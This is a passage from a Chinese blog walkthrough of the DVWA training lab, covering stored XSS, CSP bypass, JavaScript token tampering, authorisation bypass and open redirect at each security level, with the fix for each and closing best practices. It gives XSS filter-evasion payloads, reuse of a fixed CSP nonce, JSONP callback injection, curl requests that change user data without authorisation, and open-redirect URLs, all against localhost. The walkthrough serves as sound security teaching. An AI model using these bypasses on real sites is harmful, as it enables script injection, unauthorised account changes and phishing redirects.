<li>对于 name：将所有 <code>&lt;script&gt;</code> 标签替换为空。</li>
</ul>
<p>很显然，对 name 的处理存在和上一关（反射型 XSS）一样的问题，可以双写 <code>&lt;script&gt;</code> 或者使用 img 标签。</p>
<p>对于 name 输入框的长度限制，直接在浏览器里修改该元素的 maxlength 属性即可。</p>
<pre><code class="language-html">&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>
</code></pre>
<h3><a id="highname-正则表达式替换" class="content__heading-anchor"></a>High：name 正则表达式替换</h3>
<p>和反射型 XSS 里一样，将处理 name 字段时的 <code>str_replace</code> 子串替换，换成了基于正则表达式的替换。双写不能用了，但是 img 还是可以用：</p>
<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>
</code></pre>
<h3><a id="impossiblehtmlspecialchars-1" class="content__heading-anchor"></a>Impossible：htmlspecialchars</h3>
<p>相比 high 等级，这个等级：</p>
<ul>
<li>增加了 CSRF 防护。</li>
<li>通过 <code>htmlspecialchars</code> 转义 name。</li>
</ul>
<p>存储型 XSS 这一关和反射型非常类似。最佳安全实践也一样：使用 <code>htmlspecialchars</code>。</p>
<h2><a id="content-security-policy-csp-bypass" class="content__heading-anchor"></a>Content Security Policy (CSP) Bypass</h2>
<p>浏览器的内容安全策略，是可以在 Content-Security-Policy 相应头中定义的一系列规则，告诉浏览器在访问内容时应该添加何种限制。</p>
<p><strong>攻击者的目标是：</strong>通过 script 标签，引入外部脚本。</p>
<h3><a id="low引用-script-的限制" class="content__heading-anchor"></a>Low：引用 script 的限制</h3>
<p>这一等级给出一个表单，提交的 URL 会被作为 script 的 src 引入。</p>
<p>这一等级的 Content-Security-Policy 请求头内容如下：</p>
<pre><code>Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja;
// allows js from self, pastebin.com, hastebin.com, jquery, digi.ninja, and google analytics.
</code></pre>
<p>页面给出了五个测试链接：</p>
<ul>
<li><code>alert.js</code>：成功引用</li>
<li><code>alert.txt</code>：无法引用</li>
<li><code>cookie.js</code>：成功引用</li>
<li><code>forced_download.js</code>：无法引用</li>
<li><code>wrong_content_type.js</code>：无法引用</li>
</ul>
<p>网页引入的 script 脚本，要满足如下限制：</p>
<ul>
<li>MIME 必须是 <code>text/javascript</code>。</li>
<li>相应头不能包含 <code>Content-Disposition: attachment</code>。</li>
</ul>
<h3><a id="medium不变的-nonce" class="content__heading-anchor"></a>Medium：不变的 nonce</h3>
<p>这一等级给出一个表单，提交的内容会被直接插入 HTML 中，且关闭了 XSS 防护。</p>
<p>该等级的 Content-Security-Policy 请求头：</p>
<pre><code>Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;
</code></pre>
<p>请求头里包含了 nonce。nonce 后加一个 base64 编码后的字符串。添加这一限制后，所有 script 都必须带上相同的 nonce，否则浏览器就拒绝执行。</p>
<p>然而，这一等级中 nonce 并不是每次随机生成的，而是一个固定的字符串 <code>Tm...XA=</code>。事实上，base64 解码之后内容是：「Never going to give you up」……</p>
<p>只要提交这样的一段 script 即可：</p>
<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3><a id="highjsonp" class="content__heading-anchor"></a>High：JSONP</h3>
<p>这一等级中，页面调用 <code>jsonp.php</code> 执行代码。</p>
<p>JSONP（JSON with Padding）是一种跨域请求的技术，动态创建 script 标签，并将跨域请求到的资源当作 JavaScript 代码执行。</p>
<p>可以看到这个页面中 button 绑定的回调函数：</p>
<pre><code class="language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">clickButton</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);
    s.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(s);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">solveSum</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) {
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;answer&quot;</span>).<span class="hljs-property">innerHTML</span> = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];
    }
}
</code></pre>
<p><code>jsonp.php</code> 脚本内容如下：</p>
<pre><code class="language-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;callback&quot;</span>, <span class="hljs-variable">$_GET</span>)) {
    <span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>];
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;
}

<span class="hljs-variable">$outp</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&quot;answer&quot;</span> =&gt; <span class="hljs-string">&quot;15&quot;</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span> . <span class="hljs-string">&quot;(&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$outp</span>).<span class="hljs-string">&quot;)&quot;</span>;
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>当传入 callback 参数为 <code>solveSum</code>，<code>jsonp.php</code> 将构造一段 JavaScript 代码，这段代码用指定的参数调用 <code>solveSum</code>。即：</p>
<pre><code class="language-js"><span class="hljs-title function_">solveSum</span>({<span class="hljs-attr">answer</span>: <span class="hljs-number">15</span>})
</code></pre>
<p>其实目的是为了拿到其中的 JSON 数据，但是以调用函数的代码形式返回，外面这层函数就叫做 padding，故名曰 JSON with Padding。</p>
<p>然而，JSONP 将调用传入的 callback 参数，这个函数是前端传入的。我们只要重新定义 callback 参数的内容，就能让页面执行我们想要的 JavaScript 代码。比如：</p>
<pre><code class="language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">clickButton</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);
    s.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;source/jsonp.php?callback=alert&quot;</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(s);
}
</code></pre>
<h3><a id="impossible硬编码函数名" class="content__heading-anchor"></a>Impossible：硬编码函数名</h3>
<p>这一等级仍然使用 JSONP，但是不读取 callback 的值，而是将 solveSum 这一函数名硬编码进 <code>jsonp.php</code>。这才是使用 JSONP 的正确方式。</p>
<h2><a id="javascript-attacks" class="content__heading-anchor"></a>JavaScript Attacks</h2>
<p>这一关提供了一个表单，我们可以提交一个 phase，同时前端计算了 <code>ChangeMe</code> 这个 phase 的哈希，后端验证哈希是否匹配。</p>
<p><strong>攻击者的目标是：</strong>成功提交 <code>success</code> 这个单词，并通过哈希验证。</p>
<h3><a id="low内联脚本" class="content__heading-anchor"></a>Low：内联脚本</h3>
<p>如果直接提交 <code>success</code> 会提示 Invalid token。显然，表单里有个隐藏的 token。</p>
<p>‍查看 HTML，能找到表单后的一段 script：</p>
<pre><code class="language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">rot13</span>(<span class="hljs-params">inp</span>) {
  <span class="hljs-keyword">return</span> inp.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>){<span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c&lt;=<span class="hljs-string">&quot;Z&quot;</span>?<span class="hljs-number">90</span>:<span class="hljs-number">122</span>)&gt;=(c=c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>)+<span class="hljs-number">13</span>)?<span class="hljs-attr">c</span>:c-<span class="hljs-number">26</span>);});
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">generate_token</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">var</span> phrase = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">md5</span>(<span class="hljs-title function_">rot13</span>(phrase));
}

<span class="hljs-title function_">generate_token</span>();
</code></pre>
<p>当页面打开时，该脚本将输入框中的内容通过某种方式算出 MD5 作为 token。可以猜到，后端肯定是检查了 token 和 phase 是否匹配。然而当页面刚加载时 phase 是 <code>ChangeMe</code>，除非直接提交 <code>ChangeMe</code>，其他任何 phase 都会显示 Invalid token。</p>
<p>既然前端代码都能看见了，对 <code>success</code> 这个 phase 也用这种方式计算出其 MD5 就行了。其实，只要输入 <code>success</code>，然后在 console 里调用 <code>generate_token()</code>，就会计算出对应的 token，提交即可。</p>
<h3><a id="medium外部脚本简单混淆" class="content__heading-anchor"></a>Medium：外部脚本，简单混淆</h3>
<p>和 low 的区别在于：</p>
<ul>
<li>不在 HTML 中内联 JavaScript，而是加载外部的 js 文件。</li>
<li>JavaScript 脚本做了简单的混淆，所有函数名、变量名都用了和代码含义无关的命名。</li>
</ul>
<pre><code class="language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--)
        t += e[n];
    <span class="hljs-keyword">return</span> t
}
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-title function_">do_elsesomething</span>(<span class="hljs-string">&quot;XX&quot;</span>)
}, <span class="hljs-number">300</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">do_elsesomething</span>(<span class="hljs-params">e</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> + <span class="hljs-string">&quot;XX&quot;</span>)
}
</code></pre>
<p>好在混淆后的代码也并不难懂，页面加载后延时 300ms 调用 <code>do_elsesomething</code> 函数计算 token。我们仍然只要输入 <code>success</code> 后在 console 里调用 <code>do_elsesomething(&quot;XX&quot;)</code> 再提交即可。</p>
<h3><a id="high高级混淆" class="content__heading-anchor"></a>High：高级混淆</h3>
<p>和 medium 相比，这次代码做了充分的混淆，使代码几乎不可读。仔细观察，这段代码里用了 <code>eval</code> 函数。代码<strong>先构造出要执行的 JavaScript 代码</strong>，然后使用 <code>eval</code> 执行。</p>
<p>既然构造出的代码要被执行，那能不能被我们看到呢？答案是肯定的。</p>
<p>在 F12 里选中 Submit 按钮，可以看到其 click 事件绑定了一个函数，这个函数来源于 VM8084:1：</p>
<p><a href="https://blog.skywt.cn/usr/uploads/2024/05/4124032546.png" data-fancybox data-caption="F12 console 里看到的事件绑定"><img src="https://blog.skywt.cn/usr/uploads/2024/05/4124032546.png" alt="F12 console 里看到的事件绑定" title="F12 console 里看到的事件绑定" /></a></p>
<p>这个 VM 指的是 V8 引擎为<strong>没有对应来源的 JavaScript</strong> 创造的虚拟机环境。对于有对应来源的脚本，这个地方本来会显示源文件地址。</p>
<p>进入这个 VM8084:1，就能看到脚本构造出的可读 JavaScript 代码。看来，之前的代码混淆相当于没有作用了。</p>
<pre><code class="language-js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)
}, <span class="hljs-number">300</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);
<span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);
</code></pre>
<p>显然，代码按照顺序调用了三个 <code>token_part</code> 函数。我们也仿照这个流程进行即可。</p>
<p>将输入框中内容改为 <code>success</code>，然后在 console 中调用：</p>
<pre><code class="language-js"><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);
<span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>);
</code></pre>
<p>然后点击 Submit（绑定的 Event Listener 会调用 <code>token_part_3</code>），就能完成提交。</p>
<h3><a id="impossible不要相信前端发来的任何数据" class="content__heading-anchor"></a>Impossible：不要相信前端发来的任何数据</h3>
<blockquote>
<p>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</p>
</blockquote>
<p>永远不要相信前端发来的任何数据，不管在前端用了怎样的 JavaScript 处理。对于这个问题，没有 impossible 的解决方案。</p>
<h2><a id="authorisation-bypass" class="content__heading-anchor"></a>Authorisation Bypass</h2>
<p>在这关里，提供了一个用户管理列表，但是只有管理员用户 admin 可以访问。</p>
<p><strong>攻击者的目标是：</strong>作为非管理员用户，实现用户管理的功能。</p>
<p>完成这关时，必须以非管理员用户登录 DVWA，例如名为 gordonb（密码 abc123）的用户。</p>
<h3><a id="low无防护-6" class="content__heading-anchor"></a>Low：无防护</h3>
<p>通过 gordonb 用户登录，会发现左侧 Authorisation Bypass 这一关消失了。</p>
<p>然而，不难发现每一关对应一个子路径。依然可以通过这个 URL 进入用户管理：</p>
<pre><code>http://localhost/vulnerabilities/authbypass/
</code></pre>
<p>没有做任何的鉴权，只要进入页面就有修改编辑用户的权限。</p>
<h3><a id="mediumui-不让进接口还能用" class="content__heading-anchor"></a>Medium：UI 不让进，接口还能用</h3>
<p>通过 low 的方式，可以发现进不去这一关了，提示「Unauthorised」。</p>
<p>然而，我们还是可以先研究研究这关的源码，在这个地址：</p>
<pre><code>http://localhost/vulnerabilities/view_source.php?id=authbypass&amp;security=medium
</code></pre>
<pre><code class="language-php">
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*

Only the admin user is allowed to access this page.

Have a look at these two files for possible vulnerabilities: 

* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php

*/</span>

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() != <span class="hljs-string">&quot;admin&quot;</span>) {
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>看起来这个页面是进不去了。根据提示，可以发现通过 <code>get_user_data.php</code> 文件还是可以获取用户信息，访问下面这个 URL 能获取所有用户信息的 JSON：</p>
<pre><code>http://localhost/vulnerabilities/authbypass/get_user_data.php
</code></pre>
<p>也就是说没有做接口的鉴权，只做了 UI 的鉴权。</p>
<p>同样地，可以通过 <code>change_user_details.php</code> 更新用户信息：</p>
<pre><code class="language-bash">curl <span class="hljs-string">&#x27;http://localhost/vulnerabilities/authbypass/change_user_details.php&#x27;</span> \
  -H <span class="hljs-string">&#x27;Accept: application/json&#x27;</span> \
  -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> \
  -H <span class="hljs-string">&#x27;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=medium; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&#x27;</span> \
  -H <span class="hljs-string">&#x27;Origin: http://localhost&#x27;</span> \
  --data-raw <span class="hljs-string">&#x27;{&quot;id&quot;:2,&quot;first_name&quot;:&quot;Gordon&quot;,&quot;surname&quot;:&quot;Brown1&quot;}&#x27;</span>
</code></pre>
<p>通过这两个接口，虽然进不去管理员 UI，但是能获得相同的功能。</p>
<h3><a id="high修改接口仍可用" class="content__heading-anchor"></a>High：修改接口仍可用</h3>
<p>和 medium 相比，<code>get_user_data.php</code> 做了鉴权，但是 <code>change_user_details.php</code> 没有。</p>
<pre><code class="language-bash">curl <span class="hljs-string">&#x27;http://localhost/vulnerabilities/authbypass/change_user_details.php&#x27;</span> \
  -H <span class="hljs-string">&#x27;Accept: application/json&#x27;</span> \
  -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> \
  -H <span class="hljs-string">&#x27;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=high; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&#x27;</span> \
  -H <span class="hljs-string">&#x27;Origin: http://localhost&#x27;</span> \
  --data-raw <span class="hljs-string">&#x27;{&quot;id&quot;:2,&quot;first_name&quot;:&quot;Gordon&quot;,&quot;surname&quot;:&quot;Brown2&quot;}&#x27;</span>
</code></pre>
<p>这个等级想要模拟的是愚蠢的开发者漏掉了这个接口的鉴权。</p>
<h3><a id="impossible全部鉴权" class="content__heading-anchor"></a>Impossible：全部鉴权</h3>
<p>对 <code>change_user_details.php</code> 文件也加上鉴权。至此所有页面、接口都需要认证才能使用了。</p>
<h2><a id="open-http-redirect" class="content__heading-anchor"></a>Open HTTP Redirect</h2>
<p>这一关里，给出的 URL 中通过给指定页面的参数，让页面为我们重定向。该情境的本意是只能重定向到指定的两个页面。</p>
<p><strong>攻击者的目标：</strong>使之重定向到任何我们想要的页面。</p>
<h3><a id="low直接重定向" class="content__heading-anchor"></a>Low：直接重定向</h3>
<p>无脑将 <code>redirect</code> 参数作为 <code>location.href</code> 的值。可以重定向到任何网站：</p>
<pre><code>http://localhost/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com
</code></pre>
<h3><a id="medium不能含有协议名" class="content__heading-anchor"></a>Medium：不能含有协议名</h3>
<p>判断目标 URL 中是否包含 <code>http://</code> 或者 <code>https://</code>，如果包含则拒绝重定向。</p>
<p>表示 URL 时，如果没有明确指定协议，直接以 <code>//</code> 开头，则表示使用和当前页面相同的协议。现在绝大部分网站又都支持将 HTTP 重定向到 HTTPS。所以，只需要：</p>
<pre><code>http://localhost/vulnerabilities/open_redirect/source/medium.php?redirect=//www.baidu.com
</code></pre>
<h3><a id="high必须包含子串" class="content__heading-anchor"></a>High：必须包含子串</h3>
<p>目标 URL 中必须包含 <code>info.php</code> 这个子串，否则拒绝重定向。</p>
<p>这也很好绕过，最简洁的方式就是加一个没用的 param：</p>
<pre><code>http://localhost/vulnerabilities/open_redirect/source/high.php?redirect=https://www.baidu.com?a=info.php
</code></pre>
<h3><a id="impossible白名单-2" class="content__heading-anchor"></a>Impossible：白名单</h3>
<p>最终，最安全的方式还是白名单。这一等级直接判断目标是 <code>info.php?id=1</code> 或者 <code>info.php?id=2</code>，其他一概拒绝。</p>
<h2><a id="总结web-安全的一些最佳实践" class="content__heading-anchor"></a>总结：Web 安全的一些最佳实践</h2>
<p>根据以上漏洞的尝试和探索，可以得出这些 Web 安全的最佳实践：</p>
<ul>
<li>白名单比黑名单更安全。</li>
<li>不要相信前端发来的任何数据。</li>
<li>不要在 HTML 或 SQL 里插入没有转义过的 string。</li>
<li>不想让用户知道的处理逻辑，就放到后端。不要尝试在前端「隐藏代码」，这是不可能的。</li>
</ul>
<p>开发 Web 应用过程中可能有无数的坑，而踩到了安全方面的坑则特别可能带来极大的损失。最重要的是，在设计和开发的过程中要有充分的<strong>安全意识</strong>，避免各种形式的不良实践。</p>
 </article> </section> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script> <hr class="page__divide page__divide--between-sections"> <astro-island uid="1HpkIM" prefix="r0" component-url="/_astro/Comments.CQWrrEpu.js" component-export="default" renderer-url="/_astro/client.Bd2Qst3j.js" props="{&quot;articleId&quot;:[0,161]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;Comments&quot;,&quot;value&quot;:true}" await-children=""><section class="page__section"><h2><i class="ri-discuss-line"></i> 暂无评论</h2></section><hr class="page__divide page__divide--between-sections"/><section class="page__section"><h2><i class="ri-discuss-line"></i> 发表新的评论</h2><p class="mt-4 card card--in-content"><b>所有评论都将经过博主审核。</b>请勿填写无意义邮箱或发表无关评论、广告等，否则会被视为垃圾评论。</p><form class="mt-4 form"><input placeholder="你的名字" type="text" class="form__input" required="" value=""/><input placeholder="邮箱" type="email" class="form__input" required="" value=""/><input placeholder="网址" type="url" class="form__input" value=""/><textarea rows="8" class="sm:col-span-3 form__input" placeholder="说点什么吧……" required=""></textarea><button type="submit" class="sm:col-span-3 form__button">提交</button></form><p class="mt-4 text-secondary text-sm leading-normal">提交评论即表明你同意本网站使用 Cookie，并允许本站在后台记录你的邮箱、IP 地址等必要信息。这些信息不会被透露给其他用户。（提交一次评论后，本提示将不再展示）</p></section><!--astro:end--></astro-island>  </main>  <footer class="footer"> <div class="footer__row"> <div class="m-2"> <a href="/" class="link">SkyWT</a> <span>
/
<a href="/blog" class="link"> 博客 </a> </span><span>
/
DVWA 通关教程 </span> </div> <div class="m-2"> <ul data-astro-cid-tfcnbjmv> <li data-astro-cid-tfcnbjmv> <a class="link" href="/" data-astro-cid-tfcnbjmv> 
主页
</a> </li> <li data-astro-cid-tfcnbjmv> <a class="link" href="/blog" data-astro-cid-tfcnbjmv>  博客 </a> </li><li data-astro-cid-tfcnbjmv> <a class="link" href="/lab" data-astro-cid-tfcnbjmv>  实验室 </a> </li><li data-astro-cid-tfcnbjmv> <a class="link" href="/friends" data-astro-cid-tfcnbjmv>  友人 </a> </li><li data-astro-cid-tfcnbjmv> <a class="link" href="/about" data-astro-cid-tfcnbjmv>  关于 </a> </li> </ul>  </div> </div> <hr class="footer__divide"> <div class="footer__row"> <p class="m-2">
&#169; 2017-2024 <a href="/" class="link">SkyWT</a> |
<a href="/sitemap-index.xml" class="link">站点地图</a>
|
<a href="/friends" class="link">友情链接</a>
|
<a href="https://foreverblog.cn/go.html" target="_blank" class="link">虫洞</a> </p> <p class="m-2"> <a href="https://www.boyouquan.com/" target="_blank" class="mx-1"> <img src="/boyouquan.png" alt="Boyouquan Badge" class="inline-block h-4 grayscale"> </a> <a href="https://www.foreverblog.cn/" target="_blank" class="mx-1"> <img src="/forever_blog.png" alt="Forever Blog Badage" class="inline-block h-4 grayscale"> </a> <a href="https://blogscn.fun/" target="_blank" class="mx-1"> <img src="/blogscn.png" alt="BLOGS·CN Badge" class="inline-block h-4 grayscale"> </a> </p> </div> <div class="footer__row"> <p class="m-2"> <a href="https://beian.miit.gov.cn/" target="_blank" class="link">
浙 ICP 备 2021019606 号 - 1</a>
|
<a href="https://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33080202000472" target="_blank" class="link before:content-[url('/mps.png')] before:align-middle">
浙公网安备 33080202000472 号</a> </p> <div class="m-2"> <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" class="inline-block mx-1" data-astro-cid-h3ykra2n> <img class="icon" src="/cc/cc.svg" data-astro-cid-h3ykra2n> <img class="icon" src="/cc/by.svg" data-astro-cid-h3ykra2n> <img class="icon" src="/cc/nc.svg" data-astro-cid-h3ykra2n>   </a>  <a href="https://notbyai.fyi" target="_blank" class="inline-block mx-1" data-astro-cid-hwbnc4sm> <img src="/not-by-ai-light.svg" alt="Not By AI Badge" class="badge inline-block dark:hidden" data-astro-cid-hwbnc4sm> <img src="/not-by-ai-dark.svg" alt="Not By AI Badge" class="badge hidden dark:inline-block" data-astro-cid-hwbnc4sm> </a>  </div> </div> </footer> </body></html> 